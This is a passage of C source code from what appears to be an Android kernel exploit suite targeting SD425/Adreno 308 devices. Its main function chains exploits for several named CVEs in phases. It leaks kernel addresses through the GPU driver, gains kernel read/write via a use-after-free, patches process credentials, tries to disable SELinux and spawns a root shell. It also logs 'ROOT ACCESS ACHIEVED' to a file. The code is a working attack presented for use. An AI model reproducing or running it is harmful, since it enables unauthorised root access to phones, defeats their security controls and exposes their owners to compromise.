           getuid(), getgid(), geteuid(), getegid());
    fd = open("/proc/self/status", O_RDONLY);
    if (fd >= 0) {
        ssize_t n = read(fd, buf, sizeof(buf)-1);
        close(fd);
        if (n > 0) {
            buf[n] = '\0';
            char *line = strtok(buf, "\n");
            while (line) {
                if (strstr(line, "Uid:") || strstr(line, "Gid:") ||
                    strstr(line, "Cap") || strstr(line, "Seccomp"))
                    printf("  %s\n", line);
                line = strtok(NULL, "\n");
            }
        }
    }
    struct __user_cap_header_struct cap_header = { _LINUX_CAPABILITY_VERSION_3, 0 };
    struct __user_cap_data_struct cap_data[2] = {{0}};
    if (capget(&cap_header, cap_data) == 0) {
        printf("  Capabilities: eff=0x%llx, perm=0x%llx, inh=0x%llx\n",
               (unsigned long long)cap_data[0].effective,
               (unsigned long long)cap_data[0].permitted,
               (unsigned long long)cap_data[0].inheritable);
    }
    printf("[INFO] === End System Information ===\n\n");
}

static int final_root_check(void) {
    if (getuid() == 0) {
        printf("\n[+] ========================================\n");
        printf("[+] SUCCESS: Running as root (UID=0)!\n");
        printf("[+] ========================================\n\n");
        system("id");
        system("echo '=== ROOT ACCESS ACHIEVED ===' > /data/local/tmp/root.txt");
        system("id >> /data/local/tmp/root.txt");
        system("ps -Z >> /data/local/tmp/root.txt");
        system("getenforce >> /data/local/tmp/root.txt");
        system("ls -la /data/local/tmp/root.txt");
        pid_t pid = fork();
        if (pid == 0) {
            setuid(0); setgid(0);
            execl("/system/bin/sh", "sh", NULL);
            exit(1);
        } else if (pid > 0) {
            int status;
            waitpid(pid, &status, 0);
        }
        g_root_achieved = 1;
        return 0;
    }
    printf("\n[-] Still running as UID=%d\n", getuid());
    return -1;
}

static int run_exploit_with_timeout(int (*func)(void), int timeout_sec) {
    pid_t pid = fork();
    if (pid == 0) {
        exit(func() == 0 ? 0 : 1);
    }
    int status;
    int remaining = timeout_sec;
    while (remaining > 0) {
        if (waitpid(pid, &status, WNOHANG) == pid) {
            return (WIFEXITED(status) && WEXITSTATUS(status) == 0) ? 0 : -1;
        }
        sleep(1);
        remaining--;
    }
    kill(pid, SIGKILL);
    waitpid(pid, NULL, 0);
    return -1;
}

/* ---- main ---- */
int main(void) {
    int cve_2019_2023_handle = -1;
    int method_success = 0;
    int kernel_rw_obtained = 0;
    int gpu_leak_ok = 0;
    int qseecom_ok = 0;
    uint64_t leaked_addr = 0;

    printf("==================================================\n");
    printf("  Unified CVE Exploitation Suite v5.2\n");
    printf("  (CVE-2019-2023, 2020-0041, 2020-0423,\n");
    printf("   CVE-2022-25664, CVE-2021-1961,\n");
    printf("   CVE-2023-20938-inspired)\n");
    printf("  Target: SD425 / Adreno 308 (ARM64)\n");
    printf("==================================================\n\n");

    bind_cpu();
    gather_system_info();

    printf("[PHASE 1] CVE-2019-2023\n");
    cve_2019_2023_handle = exploit_cve_2019_2023();

    printf("\n[PHASE 2] CVE-2020-0041\n");
    test_cve_2020_0041();

    printf("\n[PHASE 3] CVE-2020-0423\n");
    test_cve_2020_0423();

    printf("\n[PHASE 4] CVE-2022-25664 (GPU leak - multi-try)\n");
    for (int try = 0; try < 3; try++) {
        if (exploit_cve_2022_25664_leak(&leaked_addr, &g_kernel_base) == 0) {
            gpu_leak_ok = 1;
            printf("  [+] GPU leak success: addr=0x%llx\n", (unsigned long long)leaked_addr);
            if (g_task_struct == 0 && leaked_addr != 0) {
                g_task_struct = leaked_addr;
                g_cred_off = TASK_REAL_CRED_OFF;
                if (setup_kernel_rw() == 0) {
                    if (patch_kernel_cred() == 0) {
                        printf("  [+] Cred patched via GPU leak!\n");
                        if (getuid() == 0) { final_root_check(); return 0; }
                    }
                }
            }
            break;
        }
        usleep(200000);
    }
    if (!gpu_leak_ok) printf("  [-] GPU leak failed\n");

    printf("\n[PHASE 5] CVE-2020-0423 (UAF) Kernel RW with improved spray (FIXED HANG)\n");
    if (run_exploit_with_timeout(exploit_cve_2020_0423_rw, 60) == 0) {
        kernel_rw_obtained = 1;
        printf("  [+] Kernel RW via CVE-2020-0423 obtained!\n");
        if (setup_kernel_rw() == 0) {
            if (patch_kernel_cred() == 0) {
                printf("  [+] Cred patched via CVE-2020-0423!\n");
                if (getuid() == 0) { final_root_check(); return 0; }
            }
        }
    } else {
        printf("  [-] CVE-2020-0423 RW failed or timed out\n");
    }

    printf("\n[PHASE 6] CVE-2020-0041 (OOB) cred overwrite attempt\n");
    if (run_exploit_with_timeout(exploit_cve_2020_0041_patch_cred, 5) == 0) {
        if (getuid() == 0) { final_root_check(); return 0; }
    }

    printf("\n[PHASE 7] CVE-2021-1961 (QSEECom - requires system uid)\n");
    if (g_system_privilege || getuid() == 1000 || getuid() == 0) {
        if (exploit_cve_2021_1961() == 0) {
            qseecom_ok = 1;
            if (getuid() == 0) { final_root_check(); return 0; }
        }
    } else {
        printf("  [-] Skipping (need system or root uid, current=%d)\n", getuid());
    }

    printf("\n[PHASE 8] SELinux disable via kernel (CVE-2023-20938 inspired)\n");
    if (g_krw_pipe[0] >= 0) {
        try_selinux_disable_via_kernel();
    } else {
        printf("  [-] No kernel RW, skipping\n");
    }

    printf("\n[PHASE 9] Multi-method privilege escalation (fallback)\n");
    int methods[] = {1,2,3,4,5,6,7,8};
    for (size_t mi = 0; mi < sizeof(methods)/sizeof(methods[0]); mi++) {
        if (g_root_achieved) break;
        switch(methods[mi]) {
            case 1: if (try_all_setuid_methods() == 0) method_success++; break;
            case 2: if (try_capset_method() == 0) method_success++; break;
            case 3: if (try_all_execve_methods() == 0) method_success++; break;
            case 4: if (try_unshare_method() == 0) method_success++; break;
            case 5: if (try_ptrace_methods() == 0) method_success++; break;
            case 6: if (try_selinux_methods() == 0) method_success++; break;
            case 7: if (try_property_methods() == 0) method_success++; break;
            case 8: dump_block_devices(); break;
        }
        if (getuid() == 0) { g_root_achieved = 1; break; }
    }

    printf("\n[PHASE 10] Information gathering\n");
    gather_proc_info();

    printf("\n[PHASE 11] Final verification\n");
    final_root_check();

    printf("\n==================================================\n");
    printf("  Summary:\n");
    char msg[128];
    if (cve_2019_2023_handle >= 0)
        snprintf(msg, sizeof(msg), "SUCCESS (handle=%d)", cve_2019_2023_handle);
    else
        snprintf(msg, sizeof(msg), "FAILED");
    printf("    CVE-2019-2023: %s\n", msg);
    printf("    CVE-2022-25664: %s\n", gpu_leak_ok ? "LEAKED" : "FAILED");
    printf("    CVE-2020-0423 RW: %s\n", kernel_rw_obtained ? "SUCCESS" : "FAILED");
    printf("    CVE-2021-1961: %s\n", qseecom_ok ? "TRIGGERED" : "SKIPPED/FAILED");
    printf("    Method successes: %d\n", method_success);
    printf("    Root achieved: %s\n", g_root_achieved ? "YES" : "NO");
    printf("    Final UID: %d\n", getuid());
    printf("==================================================\n");

    return g_root_achieved ? 0 : 1;
}
